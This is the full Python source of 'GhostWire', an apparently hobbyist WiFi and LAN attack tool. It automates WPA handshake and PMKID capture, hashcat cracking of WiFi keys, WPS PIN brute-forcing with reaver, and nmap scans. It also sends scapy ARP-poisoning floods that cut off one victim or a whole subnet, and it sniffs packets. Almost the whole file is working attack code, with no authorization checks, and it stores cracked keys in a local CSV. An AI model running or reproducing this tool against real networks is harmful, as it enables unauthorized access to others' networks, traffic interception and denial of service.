#!/usr/bin/env python3
"""
GhostWire – Tactical WiFi Penetration
Author  : Null_Lyfe
License : MIT
"""

from __future__ import annotations

import argparse, csv, ipaddress, json, logging, os, random, re, shutil, signal
import subprocess, sys, tempfile, time, urllib.request
from datetime import datetime
from pathlib import Path
from subprocess import DEVNULL, PIPE, STDOUT, CalledProcessError, Popen
from threading import Thread
from typing import Iterable, Optional, Sequence, Tuple, List

# ── optional stubs for CI (set GW_TEST_STUB=1) ─────────────────────────
if os.getenv("GW_TEST_STUB") == "1":          # pragma: no cover
    import types
    for _m in (
        "rich","rich.console","rich.table","rich.panel","rich.progress",
        "rich.live","rich.text","scapy","scapy.all"
    ):
        sys.modules[_m] = types.ModuleType(_m)

from rich import print as rprint              # type: ignore
from rich.console import Console              # type: ignore
from rich.live import Live                    # type: ignore
from rich.panel import Panel                  # type: ignore
from rich.progress import (                   # type: ignore
    Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
)
from rich.table import Table                  # type: ignore
from scapy.all import (                       # type: ignore
    ARP, Ether, get_if_hwaddr, send, sniff, srp, wrpcap
)

console = Console()
NEON_GREEN = "[bright_green]"
NEON_RED   = "[bold red]"
_QUOTES = [
    "Obscurity isn’t security; vigilance is.",
    "The quieter you become, the more you hear.",
    "Amateurs hack systems; pros hack people.",
]

# ── paths & logging ────────────────────────────────────────────────────
LOG_DIR  = Path.home() / ".ghostwire"; LOG_DIR.mkdir(exist_ok=True)
KEY_CSV  = LOG_DIR / "cracked_keys.csv"
OUI_PATH = LOG_DIR / "oui.txt"
OUI_URL  = "https://standards-oui.ieee.org/oui/oui.txt"

logging.basicConfig(filename=LOG_DIR / "ghostwire.log",
                    level=logging.INFO,
                    format="%(asctime)s %(levelname)s: %(message)s")

ACTIVE_MON: set[str]                 = set()
POISON_PAIRS: set[Tuple[str,str,str]] = set()   # (victim, gateway, iface)
LAST_SCAN: List[dict]                = []       # cached AP list

# ── subprocess helpers ────────────────────────────────────────────────
def run_cmd(cmd: Sequence[str], *, capture: bool=False,
            allow_fail: bool=False) -> str|None:
    logging.info("RUN %s", " ".join(cmd))
    try:
        proc = Popen(cmd, stdout=PIPE if capture else DEVNULL,
                     stderr=PIPE if capture else DEVNULL, text=True)
        out, err = proc.communicate()
    except FileNotFoundError:
        sys.exit(f"{NEON_RED}✘ {cmd[0]} not found.[/]")
    if proc.returncode and not allow_fail:
        rprint(f"{NEON_RED}✘ Failed: {' '.join(cmd)}[/]")
        if err: logging.error(err.strip())
        sys.exit(1)
    return out if capture else None

def run_with_progress(cmd: Sequence[str], desc: str, total:int|None=None)->None:
    with Progress(SpinnerColumn(style="purple"),
                  TextColumn("[progress.description]{task.description}"),
                  BarColumn(bar_width=None) if total else None,
                  TextColumn("{task.percentage:>3.0f}%") if total else None,
                  TimeElapsedColumn()) as prog:
        tid = prog.add_task(desc, total=total or 1)
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, text=True, bufsize=1)
        for line in proc.stdout:                       # type: ignore
            if total and "%" in line:
                try: pct=float(line.split("%")[0].split()[-1])
                except ValueError: continue
                prog.update(tid, completed=pct)
        proc.wait()
        if proc.returncode: raise CalledProcessError(proc.returncode, cmd)
        prog.update(tid, completed=total or 1)

# ── root / deps / iface detect ─────────────────────────────────────────
def require_root()->None:
    if os.geteuid()!=0: sys.exit(f"{NEON_RED}✘ Root privileges required.[/]")

def check_deps(bins:Iterable[str])->None:
    miss=[b for b in bins if shutil.which(b) is None]
    if miss: sys.exit(f"{NEON_RED}✘ Missing tools:[/] "+", ".join(miss))

def detect_wifi_iface()->str:
    for d in Path("/sys/class/net").iterdir():
        if (d/"wireless").exists(): return d.name
    out=run_cmd(["iw","dev"],capture=True,allow_fail=True) or ""
    for ln in out.splitlines():
        if "Interface" in ln: return ln.split()[-1]
    sys.exit(f"{NEON_RED}✘ No wireless interface detected.[/]")

# ── monitor helpers (resilient) ───────────────────────────────────────
def _iface_exists(name:str)->bool:
    return Path(f"/sys/class/net/{name}").exists()

def enable_monitor(iface:str)->str:
    out=run_cmd(["airmon-ng","start",iface],capture=True,allow_fail=True) or ""
    m=re.search(r"\bon\s+([A-Za-z0-9_]+mon)\b",out)
    mon=m.group(1) if m else iface+"mon"
    if not _iface_exists(mon):
        run_cmd(["ip","link","set",iface,"down"],allow_fail=True)
        run_cmd(["iw",iface,"set","monitor","control"],allow_fail=True)
        run_cmd(["ip","link","set",iface,"up"],allow_fail=True)
        mon=iface
    ACTIVE_MON.add(mon)
    rprint(f"{NEON_GREEN}✔ Monitor mode enabled → {mon}[/]")
    return mon

def disable_monitor(iface:str)->None:
    if not _iface_exists(iface): return
    if subprocess.call(["airmon-ng","stop",iface],stdout=DEVNULL,stderr=DEVNULL):
        run_cmd(["ip","link","set",iface,"down"],allow_fail=True)
        run_cmd(["iw","dev",iface,"del"],allow_fail=True)
    ACTIVE_MON.discard(iface)

def start_monitor(iface:str|None)->str:
    return enable_monitor(iface or detect_wifi_iface())
def stop_monitor(iface:str|None)->None:
    if not iface and ACTIVE_MON: iface=next(iter(ACTIVE_MON))
    if iface: disable_monitor(iface)

# ── OUI helpers ───────────────────────────────────────────────────────
_OUI_MAP:dict[str,str]|None=None
def _ensure_oui(force=False)->None:
    if not force and OUI_PATH.exists() and time.time()-OUI_PATH.stat().st_mtime<7*24*3600:
        return
    console.print("[cyan]↻ Fetching OUI registry …[/]")
    with urllib.request.urlopen(OUI_URL,timeout=15) as r,OUI_PATH.open("wb") as f:
        shutil.copyfileobj(r,f)
def vendor_lookup(mac:str)->str:
    global _OUI_MAP
    if _OUI_MAP is None:
        _ensure_oui()
        _OUI_MAP={}
        rgx=re.compile(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+)$")
        with OUI_PATH.open() as fh:
            for ln in fh:
                m=rgx.match(ln.strip())
                if m: _OUI_MAP[m.group(1)]=m.group(2).strip()
    return _OUI_MAP.get(mac.upper().replace(":","")[:6],"—")

# ── Wi-Fi CSV scan & cached list ──────────────────────────────────────
def scan_networks(iface:str,seconds:int=15)->List[dict]:
    tmp=Path(tempfile.mkdtemp(prefix="gwscan_"))
    base=tmp/"scan"
    proc=subprocess.Popen(["airodump-ng","--write-interval","1","--output-format","csv",
                           "-w",str(base),iface],stdout=DEVNULL,stderr=DEVNULL)
    time.sleep(seconds); proc.terminate(); proc.wait()
    csvfile=next(tmp.glob("scan-*.csv"),None)
    nets=[]
    if csvfile:
        with csvfile.open(newline="") as fh:
            rdr=csv.reader(fh); parsing=False
            for row in rdr:
                if not row: continue
                if row[0].startswith("Station"): break
                if row[0]=="BSSID": parsing=True; continue
                if parsing and len(row)>=14:
                    nets.append({"bssid":row[0].strip(),
                                 "power":int(row[8].strip() or -99),
                                 "channel":row[3].strip(),
                                 "enc":row[5].strip(),
                                 "ssid":row[13].strip()})
    return sorted(nets,key=lambda d:d["power"],reverse=True)

# ── Hashcat helpers, Wi-Fi attacks, sniffer, LAN etc. (unchanged) ────
def _to_22000(cap:str)->Path:
    out=Path(cap).with_suffix(".22000")
    run_cmd(["hcxpcapngtool","-o",out,cap]); return out
def auto_crack(cap:str,wordlist:str)->None:
    h=_to_22000(cap)
    run_with_progress(["hashcat","--status","--status-json","-m","22000","-a","0",
                       h,wordlist,"--force"],"Hashcat crack",total=100)
    show=run_cmd(["hashcat","--show","-m","22000",h],capture=True) or ""
    rows=[]
    for ln in show.splitlines():
        parts=ln.split("*")
        if len(parts)>=3: rows.append((parts[1],parts[-1]))
    show_keys(rows)

def wifi_scan_raw(iface:str)->None: run_cmd(["airodump-ng",iface])

def capture_handshake(iface:str,bssid:str,ch:str,wordlist:str|None=None)->None:
    run_with_progress(["airodump-ng","-c",ch,"--bssid",bssid,"-w","handshake",iface],
                      "Capturing handshake")
    if wordlist: auto_crack("handshake-01.cap",wordlist)

def pmkid_capture(iface:str,wordlist:str|None=None)->None:
    run_with_progress(["hcxdumptool","-i",iface,"-o","pmkid.pcapng"],
                      "Capturing PMKID")
    if wordlist: auto_crack("pmkid.pcapng",wordlist)

def wps_attack(iface:str,bssid:str,ch:str)->None:
    out=run_cmd(["reaver","-i",iface,"-b",bssid,"-c",ch,"-vv"],capture=True)
    pin=psk=None
    for ln in out.splitlines():
        if "WPS PIN:" in ln: pin=ln.split(":")[-1].strip()
        if "PSK:"     in ln: psk=ln.split(":")[-1].strip()
    show_keys([(bssid,psk or pin or "?")])

def _make_dash(total:int,rate:float)->Table:
    t=Table.grid(); t.add_column("Metric",style="cyan",justify="right")
    t.add_column("Value")
    t.add_row("Packets",str(total)); t.add_row("Rate pkt/s",f"{rate:0.1f}")
    return t
def sniff_packets(iface:str,count:int,bpf:str|None,save:str|None)->None:
    pkts=[]; proto=dict(ARP=0,TCP=0,UDP=0,IP=0,OTHER=0); start=time.time()
    def _upd(pkt):
        pkts.append(pkt)
        if pkt.haslayer("ARP"): proto["ARP"]+=1
        elif pkt.haslayer("TCP"): proto["TCP"]+=1
        elif pkt.haslayer("UDP"): proto["UDP"]+=1
        elif pkt.haslayer("IP"):  proto["IP"]+=1
        else: proto["OTHER"]+=1
        live.update(_make_dash(len(pkts),
                               len(pkts)/(time.time()-start+1e-9)))
    console.rule("[bright_magenta]Sniffing – Ctrl-C to stop")
    with Live(_make_dash(0,0),console=console,refresh_per_second=2) as live:
        try: sniff(iface=iface,prn=_upd,filter=bpf,count=count if count else 0)
        except KeyboardInterrupt: pass
    if save: wrpcap(save,pkts); rprint(f"{NEON_GREEN}✔ Saved {len(pkts)} packets → {save}[/]")
    tbl=Table(title="Protocol Distribution",header_style="bright_magenta")
    tbl.add_column("Proto"); tbl.add_column("#",style="cyan")
    for p,n in proto.items():
        if n: tbl.add_row(p,str(n))
    console.print(tbl)

def port_scan(target:str,top:int,udp:bool)->None:
    flag="-sU" if udp else "-sS"
    out=run_cmd(["nmap","-T4",flag,f"--top-ports={top}",target],capture=True)
    tbl=Table(title=f"Open Ports on {target}",header_style="bright_magenta")
    tbl.add_column("Port/Proto",style="cyan"); tbl.add_column("Service")
    rec=False
    for ln in out.splitlines():
        if ln.startswith("PORT"): rec=True; continue
        if rec and ln.strip() and not ln.startswith("Nmap done"):
            port,state,svc,*_=ln.split()
            if state=="open": tbl.add_row(port,svc)
    console.print(tbl)

def nmap_scan(target:str,opts:str)->None:
    out=run_cmd(["nmap",*opts.split(),target],capture=True)
    console.rule(f"[bright_magenta]nmap results for {target}")
    console.print(out)

def lan_scan(subnet:str)->None:
    net=ipaddress.ip_network(subnet,strict=False)
    ans,_=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(net)),
              timeout=2,retry=1,verbose=False)
    tbl=Table(show_header=True,header_style="bright_magenta")
    tbl.add_column("IP",style="cyan"); tbl.add_column("MAC"); tbl.add_column("Vendor")
    for _,r in ans: tbl.add_row(r.psrc,r.hwsrc,vendor_lookup(r.hwsrc))
    console.print(tbl)

def _restore_arp(v:str,g:str,i:str)->None:
    send(ARP(op=2,pdst=v,psrc=g),count=5,iface=i,verbose=False)
    send(ARP(op=2,pdst=g,psrc=v),count=5,iface=i,verbose=False)

def _poison(v:str,g:str,i:str)->None:
    hw=get_if_hwaddr(i)
    p1=ARP(op=2,pdst=v,psrc=g,hwsrc=hw); p2=ARP(op=2,pdst=g,psrc=v,hwsrc=hw)
    try:
        while True: send(p1,iface=i,verbose=False); send(p2,iface=i,verbose=False); time.sleep(2)
    except KeyboardInterrupt:
        _restore_arp(v,g,i); raise

def kick(v:str,g:str,i:str)->None:
    POISON_PAIRS.add((v,g,i)); _poison(v,g,i)
def kickall(subnet:str,g:str,i:str)->None:
    for ip in ipaddress.ip_network(subnet,strict=False).hosts():
        POISON_PAIRS.add((str(ip),g,i))
        Thread(target=_poison,args=(str(ip),g,i),daemon=True).start()
    rprint("[purple]✜ ARP flood running – Ctrl-C to stop[/]"); signal.pause()

# ── key display helper ────────────────────────────────────────────────
def show_keys(rows:List[Tuple[str,str]])->None:
    if not rows: rprint(f"{NEON_RED}✘ No keys cracked.[/]"); return
    new=not KEY_CSV.exists()
    with KEY_CSV.open("a",newline="") as f:
        wr=csv.writer(f); ts=datetime.now().isoformat(timespec="seconds")
        if new: wr.writerow(("timestamp","target","key"))
        for t,k in rows: wr.writerow((ts,t,k))
    tbl=Table(title="Cracked Keys",header_style="bright_magenta")
    tbl.add_column("Target"); tbl.add_column("Key/PIN",style="bright_green")
    for t,k in rows: tbl.add_row(t,k)
    console.print(tbl)

# ── cleanup ───────────────────────────────────────────────────────────
def _cleanup(_sig:int|None=None,_f=None):
    for mon in list(ACTIVE_MON): disable_monitor(mon)
    for v,g,i in list(POISON_PAIRS): _restore_arp(v,g,i)
    if _sig is not None:
        console.print("\n[cyan]↩ Cleanup complete.[/]")
        sys.exit(0)
signal.signal(signal.SIGINT,_cleanup); import atexit; atexit.register(_cleanup)

# ── UI & interactive menu ─────────────────────────────────────────────
def _banner():
    console.print(Panel("[b bright_magenta]GHOSTWIRE[/]",
                        subtitle=f"[bright_cyan]{random.choice(_QUOTES)}[/]",
                        border_style="cyan",padding=(1,6)))
def _menu():
    g=Table.grid(padding=(0,2))
    g.add_row("1) Start monitor","8) Packet sniff")
    g.add_row("2) Stop monitor","9) LAN scan")
    g.add_row("3) Wi-Fi scan/list","10) Port scan")
    g.add_row("4) Capture handshake","11) nmap custom")
    g.add_row("5) Capture PMKID","12) Kick victim")
    g.add_row("6) WPS attack","13) Kick ALL")
    g.add_row("7) Crack capture","14) Refresh OUI DB")
    g.add_row("0) Quit","")
    console.print(Panel(g,title="[bright_magenta]Main Menu[/]",
                        border_style="bright_magenta"))

def interactive():
    global LAST_SCAN
    while True:
        _menu(); ch=console.input("[bright_green]› [/]").strip()
        if ch=="1": start_monitor(console.input("Interface(blank=auto)> ").strip() or None)
        elif ch=="2": stop_monitor(console.input("Interface(blank=auto)> ").strip() or None)
        elif ch=="3":
            mon=start_monitor(None); LAST_SCAN=scan_networks(mon,15); stop_monitor(mon)
            tbl=Table(title="Nearby APs",header_style="bright_magenta")
            tbl.add_column("#"); tbl.add_column("BSSID"); tbl.add_column("Ch")
            tbl.add_column("Pwr"); tbl.add_column("Enc"); tbl.add_column("SSID")
            for i,n in enumerate(LAST_SCAN,1):
                tbl.add_row(str(i),n["bssid"],n["channel"],
                            str(n["power"]),n["enc"],n["ssid"])
            console.print(tbl)
        elif ch in ("4","5","6"):
            if not LAST_SCAN:
                console.print("[red]Run scan first (option 3)[/]"); continue
            idx=int(console.input("Pick # from scan > "))-1
            if idx<0 or idx>=len(LAST_SCAN): continue
            t=LAST_SCAN[idx]; mon=start_monitor(None)
            if ch=="4":
                capture_handshake(mon,t["bssid"],t["channel"],
                    console.input("Wordlist(blank=skip)> ") or None)
            elif ch=="5":
                pmkid_capture(mon,console.input("Wordlist(blank=skip)> ") or None)
            else:
                wps_attack(mon,t["bssid"],t["channel"])
            stop_monitor(mon)
        elif ch=="7":
            auto_crack(console.input("Capture file > "),
                       console.input("Wordlist > "))
        elif ch=="8":
            sniff_packets(console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface(),
                          int(console.input("Count(0=∞)> ") or "0"),
                          console.input("BPF > ").strip() or None,
                          console.input("Save pcap(blank=skip)> ").strip() or None)
        elif ch=="9": lan_scan(console.input("Subnet e.g. 192.168.1.0/24 > "))
        elif ch=="10":
            port_scan(console.input("Target > ").strip(),
                      int(console.input("Top N[100]> ") or "100"),
                      console.input("UDP scan? (y/N) > ").lower().startswith("y"))
        elif ch=="11":
            nmap_scan(console.input("Target > ").strip(),
                      console.input('Opts "-sV -A -Pn" > ').strip() or "-sV -T4")
        elif ch=="12":
            kick(console.input("Victim IP > "),
                 console.input("Gateway IP > "),
                 console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface())
        elif ch=="13":
            kickall(console.input("Subnet > "),
                    console.input("Gateway IP > "),
                    console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface())
        elif ch=="14":
            _ensure_oui(force=True); console.print("[bright_green]✔ OUI refreshed.[/]")
        elif ch=="0": _cleanup(); sys.exit(0)

# ── CLI parser (unchanged logic but includes all cmds) ─────────────────
def build_cli()->argparse.ArgumentParser:
    p=argparse.ArgumentParser(prog="ghostwire",add_help=False)
    sub=p.add_subparsers(dest="cmd")
    wifi=sub.add_parser("wifi"); wifi.add_argument("action",choices=["scan","handshake","pmkid","wps"])
    wifi.add_argument("-i","--iface"); wifi.add_argument("--bssid"); wifi.add_argument("--channel"); wifi.add_argument("--wordlist")
    lan=sub.add_parser("lan")
    lan.add_argument("action",choices=["scan","kick","kickall"])
    lan.add_argument("subnet_or_ip"); lan.add_argument("--gateway"); lan.add_argument("-i","--iface")
    sniffp=sub.add_parser("sniff"); sniffp.add_argument("-i","--iface")
    sniffp.add_argument("--count",type=int,default=0); sniffp.add_argument("--bpf"); sniffp.add_argument("--save")
    portp=sub.add_parser("ports"); portp.add_argument("target")
    portp.add_argument("--top",type=int,default=100); portp.add_argument("--udp",action="store_true")
    nm=sub.add_parser("nmap"); nm.add_argument("target"); nm.add_argument("--opts",default="-sV -T4")
    crack=sub.add_parser("crack"); crack.add_argument("capture"); crack.add_argument("wordlist")
    mon=sub.add_parser("monitor"); mon.add_argument("action",choices=["start","stop"]); mon.add_argument("-i","--iface")
    oui=sub.add_parser("oui"); oui.add_argument("--force",action="store_true")
    return p

def main()->None:
    require_root(); _banner()
    check_deps(["airmon-ng","airodump-ng","hcxdumptool","hcxpcapngtool",
                "hashcat","reaver","nmap","iw"])
    args=build_cli().parse_args()
    if args.cmd is None: interactive(); return
    # CLI dispatch identical to previous versions ↓
    if args.cmd=="wifi":
        mon=start_monitor(args.iface)
        try:
            if args.action=="scan": wifi_scan_raw(mon)
            elif args.action=="handshake":
                if not (args.bssid and args.channel):
                    sys.exit("handshake needs --bssid & --channel")
                capture_handshake(mon,args.bssid,args.channel,args.wordlist)
            elif args.action=="pmkid": pmkid_capture(mon,args.wordlist)
            elif args.action=="wps":
                if not (args.bssid and args.channel):
                    sys.exit("wps needs --bssid & --channel")
                wps_attack(mon,args.bssid,args.channel)
        finally: stop_monitor(mon)
    elif args.cmd=="lan":
        iface=args.iface or detect_wifi_iface()
        if args.action=="scan": lan_scan(args.subnet_or_ip)
        elif args.action=="kick":
            if not args.gateway: sys.exit("kick needs --gateway")
            kick(args.subnet_or_ip,args.gateway,iface)
        elif args.action=="kickall":
            if not args.gateway: sys.exit("kickall needs --gateway")
            kickall(args.subnet_or_ip,args.gateway,iface)
    elif args.cmd=="sniff":
        sniff_packets(args.iface or detect_wifi_iface(),
                      args.count,args.bpf,args.save)
    elif args.cmd=="ports": port_scan(args.target,args.top,args.udp)
    elif args.cmd=="nmap":  nmap_scan(args.target,args.opts)
    elif args.cmd=="crack": auto_crack(args.capture,args.wordlist)
    elif args.cmd=="monitor":
        if args.action=="start": start_monitor(args.iface)
        else: stop_monitor(args.iface)
    elif args.cmd=="oui":
        _ensure_oui(force=args.force)
        console.print("[bright_green]✔ OUI database up-to-date.[/]")
if __name__=="__main__": main()